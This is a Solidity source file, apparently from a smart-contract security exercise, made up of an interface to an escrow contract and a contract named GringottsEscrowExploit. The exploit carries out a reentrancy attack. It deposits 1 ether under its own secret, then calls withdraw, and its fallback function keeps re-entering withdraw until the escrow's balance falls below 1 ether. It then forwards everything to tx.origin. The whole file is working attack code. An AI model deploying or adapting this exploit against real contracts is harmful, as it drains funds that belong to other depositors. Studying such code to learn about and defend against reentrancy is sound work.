pragma solidity ^0.8.0;

contract GringottsEscrowSignature {
    function deposit(bytes32 secretHash, uint256 expiration) public payable {}

    function withdraw(string calldata secret) public {}
}

contract GringottsEscrowExploit {
    GringottsEscrowSignature public gringottsEscrow;
    string private _secret;
    bytes32 private _secretHash;

    constructor(address _gringottsEscrowAddress, string memory secret) {
        gringottsEscrow = GringottsEscrowSignature(_gringottsEscrowAddress);
        _secret = secret;
        _secretHash = keccak256(abi.encodePacked(_secret, address(gringottsEscrow)));
    }

    fallback() external payable {
        if (address(gringottsEscrow).balance >= 1 ether) {
            gringottsEscrow.withdraw(_secret);
        } else {
            (bool sent, ) = payable(tx.origin).call{value: address(this).balance}('');
            require(sent, 'FALLBACK_SEND_ISSUE');
        }
    }

    function preAttack() external payable {
        gringottsEscrow.deposit{value: 1 ether}(_secretHash, block.timestamp + 3600);
    }

    function attack() external {
        gringottsEscrow.withdraw(_secret);
    }
}
